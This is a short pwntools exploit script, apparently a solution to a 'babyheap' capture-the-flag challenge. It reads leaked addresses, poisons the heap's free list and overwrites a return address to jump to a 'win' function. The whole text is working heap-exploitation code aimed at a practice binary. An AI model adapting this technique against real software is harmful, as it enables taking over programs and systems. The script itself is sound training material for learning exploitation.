from pwn import *
BINARY = "/challenge/babyheap_level10.1"
p = process(BINARY)
binary = ELF(BINARY)

destance = 0x118

p.recvuntil(b'LEAK')
p.recvuntil(b'at: ')
stack_leak = p.recvuntil(b'.')[:-1]
ret_addr = int(stack_leak, 16) + destance

p.recvuntil(b'LEAK')
p.recvuntil(b'at: ')
main_leak = p.recvuntil(b'.')[:-1]
binary_base = int(main_leak, 16) - binary.sym.main
binary.address = binary_base

p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'100')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'100')
p.sendline(b'free')
p.sendline(b'0')
p.sendline(b'free')
p.sendline(b'1')

p.sendline(b'scanf')
p.sendline(b'1')
p.recv()
p.sendline(p64(ret_addr))
p.sendline(b'malloc')
p.sendline(b'2')
p.sendline(b'100')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'100')

p.sendline(b'scanf')
p.sendline(b'1')
p.recv()
p.sendline(p64(binary.sym.win))
p.recv()
p.sendline(b'quit')

p.interactive()